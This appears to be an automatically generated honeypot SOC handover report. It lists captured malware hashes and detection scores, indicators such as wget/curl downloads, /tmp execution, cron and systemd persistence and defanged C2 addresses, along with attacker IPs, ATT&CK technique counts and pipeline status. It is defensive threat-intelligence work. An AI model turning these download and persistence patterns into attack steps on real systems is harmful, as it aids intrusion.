| `16254f69dc7011bdd51beb489af5e9825959e4098e565332da99f8cb58b7a76e` | ELF Binary (Linux executable) (x86 32-bit) | `16254f69dc7011bd...` | 30/100 | 🟢 LOW | **1/75** 🔴 |
| `163cb287fd8f81c13901eb4ddaea2db326213f4d2095e0e64321b9afd8300480` | ELF Binary (Linux executable) (x86 32-bit) | `163cb287fd8f81c1...` | 36/100 | 🟢 LOW | **15/75** 🔴 |
| `16d3440fcc067823afc44dcbccea9fbbc2f8c68ae53b7aea45f9adff4c127086` | Bash Script | `16d3440fcc067823...` | 65/100 | 🟡 MEDIUM | **14/72** 🔴 |
| `183fb8e38eeb1160f392f6d3c473752bc5b183a5c744f23a31dcc5ae2fda87f5` | Bash Script | `183fb8e38eeb1160...` | 83/100 | 🔴 HIGH | **31/70** 🔴 |
| `1858c51b58e913ca8d868ea94493ad1c74fad15ce283d94c10c22ceb3e92541d` | ELF Binary (Linux executable) (AArch64 64-bit) | `1858c51b58e913ca...` | 42/100 | 🟡 MEDIUM | **32/75** 🔴 |
| `1946ee7ec655de32199ce87390699db1e18d80438bdf01f3b813a929e5cce4e6` | ELF Binary (Linux executable) (MIPS 32-bit) | `1946ee7ec655de32...` | 58/100 | 🟡 MEDIUM | **45/75** 🔴 |
| `197c74408e15bd1168105f564f96aace4fd4819961b724630bf5a6be4878daf8` | Bash Script | `197c74408e15bd11...` | 70/100 | 🔴 HIGH | **27/75** 🔴 |
| `1bc1c784057dc4e36fcc913fe03b1f0cae8474063b486ae3443b9ef8bced9548` | Bash Script | `1bc1c784057dc4e3...` | 50/100 | 🟡 MEDIUM | Not in VT |
| `1bd3745a4f9043ead807d7777669b0dbf5b56985e5b3dd9d7cff8384154ea4a8` | ELF Binary (Linux executable) (x86-64 64-bit) | `1bd3745a4f9043ea...` | 45/100 | 🟡 MEDIUM | **40/76** 🔴 |
| `1d64be0ba1bd9924c3e29ae460db9407e4e33afeb864c9e39377ae4a87fa09db` | Shell Script | `1d64be0ba1bd9924...` | 72/100 | 🔴 HIGH | **7/75** 🔴 |
| `1e5e56d2ffc990b1dd966e12a02d89d7dcad92c2f23c34834fbfa8c792d56520` | Unknown binary | `1e5e56d2ffc990b1...` | 22/100 | 🟢 LOW | **30/75** 🔴 |
| `1e70b63472772e3f5092ffe9c3573470e73590e6ab6d93fdcede1d368a5fd72d` | Bash Script | `1e70b63472772e3f...` | 60/100 | 🟡 MEDIUM | **27/75** 🔴 |
| `1e7c134cf160b486708c40c21f671cd6f53c7578a8047a4eb22f668476e0c4c4` | ELF Binary (Linux executable) (unknown (e_machine=0x102) 64-bit) | `1e7c134cf160b486...` | 54/100 | 🟡 MEDIUM | **35/75** 🔴 |
| `1ed8ba8b6936fd378c18a7aafeef6db8575f8ce679ab93ae7c1b36493f7bd65b` | ELF Binary (Linux executable) (MIPS 32-bit) | `1ed8ba8b6936fd37...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `1eecf2377d20768c28d741e21affaa53cf26db0d083efdbf43a92fa938b7e4be` | ELF Binary (Linux executable) (ARM 32-bit) | `1eecf2377d20768c...` | 43/100 | 🟡 MEDIUM | **34/75** 🔴 |
| `1ef0eb60318495dd0cb100fc828f28237d487b800605c7cc54155cf34582598b` | ELF Binary (Linux executable) (x86-64 64-bit) | `1ef0eb60318495dd...` | 38/100 | 🟢 LOW | **21/75** 🔴 |
| `1ff7c192f591fe63fae453eb8a91da94b276376d3880e3078c3c5a20ba6b45ab` | ELF Binary (Linux executable) (x86-64 64-bit) | `1ff7c192f591fe63...` | 46/100 | 🟡 MEDIUM | **40/75** 🔴 |
| `20260630-221457-3e8812e60d6c-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |

**Suspicious Indicators — HIGH Severity Samples:**

_`05af569c3595b01e0724bc96c989105467952fd22a8681a716cfa22ec070d78c` (05af569c3595b01e0724bc96...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Execution from /tmp` — `/tmp/.kworker`
- `chmod +x (make executable)` — `chmod +x`
- `Cron persistence` — `crontab`
- `RC script persistence` — `/etc/rc.`
- `Systemd persistence` — `systemctl enable`
- `IP:Port (possible C2)` — `64.89.161[.]96:55487`

_`07c0a0af63dde8dc2e36dc58b630dcad6563263e992877aaa704530afb8a5656` (07c0a0af63dde8dc2e36dc58...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Execution from /tmp` — `/tmp/bot`
- `chmod +x (make executable)` — `chmod +x`
- `Cron persistence` — `crontab`
- `RC script persistence` — `/etc/rc.`
- `Systemd persistence` — `systemctl enable`
- `IP:Port (possible C2)` — `64.89.160[.]222:55487`

_`09591253a95411d60c2b0d5384924aa7cafbceec1467c951c6bbb1655d748f0b` (09591253a95411d60c2b0d53...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `Execution from /tmp` — `/tmp/condi`
- `IP:Port (possible C2)` — `255.255.255[.]255:1900`

_`0fad00ddec16b67f3131aa4efffbe32d78fca178407895920b7549667d7bbfbf` (0fad00ddec16b67f3131aa4e...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `chmod +x (make executable)` — `chmod +x`

_`183fb8e38eeb1160f392f6d3c473752bc5b183a5c744f23a31dcc5ae2fda87f5` (183fb8e38eeb1160f392f6d3...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `chmod +x (make executable)` — `chmod +x`

_`197c74408e15bd1168105f564f96aace4fd4819961b724630bf5a6be4878daf8` (197c74408e15bd1168105f56...)_
- `Execution from /tmp` — `/tmp/clean_file`
- `Base64 decode (obfuscation)` — `base64 -d`
- `Cron persistence` — `crontab`

_`1d64be0ba1bd9924c3e29ae460db9407e4e33afeb864c9e39377ae4a87fa09db` (1d64be0ba1bd9924c3e29ae4...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Hardware recon` — `cat /proc/cpuinfo`
- `IP:Port (possible C2)` — `198.144.179[.]82:80`

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `108.174.147[.]36` | BR | HostGator.com LLC | **100** ⚠️ | 28 |
| `118.145.107[.]219` | CN | Beijing Volcano Engine Technology Co., Ltd. | **100** ⚠️ | 32 |
| `103.211.76[.]8` | IN | Bharatnet Communications Private Limited | **100** ⚠️ | 12 |
| `103.248.120[.]6` | IN | Shivansh Infotech pvt Ltd | **100** ⚠️ | 50 |
| `64.62.156[.]66` | US | The Shadowserver Foundation, Inc. | **100** ⚠️ | 0 |
| `45.79.207[.]110` | US | Linode | **100** ⚠️ | 50 |
| `162.255.112[.]183` | CA | Start Communications | **100** ⚠️ | 27 |
| `59.21.181[.]38` | KR | Korea Telecom | **100** ⚠️ | 13 |
| `193.8.186[.]29` | GB | Vlad Cojuhari | **100** ⚠️ | 50 |
| `104.157.47[.]144` | CA | TELUS-DSL-EDTNABXM | **100** ⚠️ | 20 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 190 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 157 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 55 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 54 |
| [T1059.004](https://attack.mitre.org/techniques/T1059/004) | 10 |

---

## 🔕 False Positive Summary (48 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 21 |
| AbuseIPDB score 1 below threshold 25 | 2 |
| AbuseIPDB score 11 below threshold 25 | 1 |
| AbuseIPDB score 12 below threshold 25 | 1 |
| AbuseIPDB score 13 below threshold 25 | 1 |
| AbuseIPDB score 14 below threshold 25 | 3 |
| AbuseIPDB score 16 below threshold 25 | 1 |
| AbuseIPDB score 23 below threshold 25 | 1 |
| AbuseIPDB score 24 below threshold 25 | 1 |
| AbuseIPDB score 5 below threshold 25 | 1 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 15 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 336 cases |
| Tool 34  | Credential Extractor        | ✅ 890 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 31 fingerprints |
| Tool 36  | Command Clustering          | ✅ 18 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 218 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 48 filtered (14.3%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 124 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 49 files |
| Tool 33  | YARA Classifier             | ✅ 34 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 152 priority case(s) shown individually · 123 recon entry/entries in table (11 group(s) consolidating 24 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

## 🛡️ CIS Controls Snapshot

| Control | Name | Status | Evidence |
|---|---|---|---|
| CIS-1 | Asset Inventory | ACTIVE | assets.json updated every pipeline run by Tool 05 — covers VM2 directly and VM1 via SSH relay |
| CIS-2 | Software Inventory | MONITORING | data/tool_manifest.json (pipeline.yml tools) + data/tool_manifest_enriched.json (enriched_corpus.yml tools) — both auto-generated each run, together tracking all active tools across both workflows, languages, and I/O paths |
| CIS-3 | Data Protection | ACTIVE | R2 archive encrypted at rest — thirha-raw-archive |
| CIS-4 | Secure Configuration | ACTIVE | haproxy.cfg, cowrie.cfg, VCN rules in config/ |
| CIS-5 | Account Management | ACTIVE | Two key pairs, dedicated cowrie user, no shared credentials |
| CIS-6 | Access Control | ACTIVE | Pipeline key vs personal key separation, GitHub Secrets |
| CIS-7 | Vulnerability Management | MONITORING | Oracle security patches — pending regular cadence |
| CIS-8 | Audit Log Management | ACTIVE | cowrie.json + cowrie.log dual streams, 59-day corpus |
| CIS-9 | Email/Web Protection | PLANNED | cloudflared tunnels planned — direct IP exposure currently |
| CIS-10 | Malware Defence | ACTIVE | Tool 31 malware analysis + Tool 33 YARA classification |
| CIS-11 | Data Recovery | ACTIVE | R2 archive, EBS snapshots, runbook recovery procedures |
| CIS-12 | Network Infrastructure | ACTIVE | VCN private networking, HAProxy TCP LB, Cloudflare DNS |

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `Aegispub/thir-ha · Oracle Cloud HA_  
_Report time: 2026-10-21T16:18:02Z_
